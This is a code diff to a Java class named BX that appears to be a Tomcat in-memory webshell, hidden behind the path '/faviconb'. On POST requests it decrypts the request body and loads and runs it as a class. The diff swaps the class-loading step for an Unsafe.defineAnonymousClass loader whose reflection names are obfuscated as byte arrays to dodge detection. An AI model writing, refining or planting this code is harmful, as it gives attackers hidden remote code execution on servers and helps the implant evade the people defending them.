@@ -4,6 +4,17 @@ import org.apache.catalina.servlets.redefine.MyRequest;
 
 public class BX {
     private static final String pathPattern= "/faviconb";
+
+    public static Class loader(byte[] bytes) throws Exception {
+        java.lang.reflect.Field field = sun.misc.Unsafe.class.getDeclaredField(new String(new byte[]{116,104,101,85,110,115,97,102,101}));
+        field.setAccessible(true);
+        Object unsafe = field.get(null);
+        java.lang.reflect.Method m = sun.misc.Unsafe.class.getDeclaredMethod(new String(new byte[]{100,101,102,105,110,101,65,110,111,110,121,109,111,117,115,67,108,97,115,115}), new Class[]{Class.class, byte[].class, Object[].class});
+        m.setAccessible(true);
+        Class clazz = (Class) m.invoke(unsafe, new Object[]{java.io.File.class, bytes, null});
+        return clazz;
+    }
+
     private static byte[] Decrypt(byte[] data) {
         byte[] dt = new byte[data.length];
         for (int i = 0; i < data.length; i++) {
@@ -59,15 +70,7 @@ public class BX {
             if (method.equals("POST")){
                 try {
                     java.util.Map objMap = (java.util.Map)obj;
-                    Object request = objMap.get("request");
-                    ClassLoader loader = MyRequest.getServletContext(request).getClass().getClassLoader();
-                    java.lang.reflect.Method defineMethod=java.lang.ClassLoader.class.getDeclaredMethod("defineClass", String.class,java.nio.ByteBuffer.class,java.security.ProtectionDomain.class);
-                    defineMethod.setAccessible(true);
-                    java.lang.reflect.Constructor<java.security.SecureClassLoader> constructor=java.security.SecureClassLoader.class.getDeclaredConstructor(ClassLoader.class);
-                    constructor.setAccessible(true);
-                    java.lang.ClassLoader cl= constructor.newInstance(loader);
-                    java.lang.Class  c=(java.lang.Class)defineMethod.invoke(cl,new Object[]{null,java.nio.ByteBuffer.wrap(Decrypt(r(in))),null});
-                    c.newInstance().equals(obj);
+                    loader(Decrypt(r(in))).newInstance().equals(obj);
                 }catch(Exception ignored) {
                 }
             }
